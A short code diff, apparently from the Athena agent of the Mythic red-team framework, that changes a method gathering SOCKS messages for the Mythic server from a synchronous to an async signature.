@@ -96,7 +96,7 @@ namespace Athena.Commands.Model
         /// <summary>
         /// Get messages from the out dictionary to forward to the Mythic server
         /// </summary>
-        public List<SocksMessage> GetMessages()
+        public async Task<List<SocksMessage>> GetMessages()
         {
             if (this.messagesOut.Count < 1)
             {
